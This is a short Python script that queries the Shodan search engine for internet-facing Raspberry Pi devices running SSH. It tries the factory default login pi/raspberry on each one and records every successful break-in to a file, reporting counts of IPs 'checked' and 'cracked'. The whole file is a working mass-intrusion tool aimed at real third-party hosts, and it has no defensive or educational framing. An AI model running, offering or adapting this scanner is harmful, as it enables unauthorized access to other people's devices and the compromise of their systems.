import paramiko
import shodan
global count, ip_counter
count = 0
ip_counter = 0

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
api = shodan.Shodan("Shodan_API_key")

def login(IPA):
	global count
	try: ssh.connect(str(IPA), username='pi', password='raspberry', timeout=10);
	except Exception: return;
	count += 1
	print("")
	print(str(count)+" : "+str(IPA))
	print("")
	data = open("IP_list.txt", "a")
	data.write(str(IPA)+"\n")


results = api.search('raspbian ssh')
for result in results['matches']:
	try:
		new_ip = str(result['ip_str'])
		print("Trying "+str(new_ip))
		ip_counter += 1
		login(new_ip)
	except Exception: pass;
	
print("")
print("<--------MINING DONE--------->")
print("")
print("<--------MINING STATS-------->")
print("Number of IP's checked: "+str(ip_counter))
print("Number of IP's cracked: "+str(count))
print("<--------MINING STATS-------->")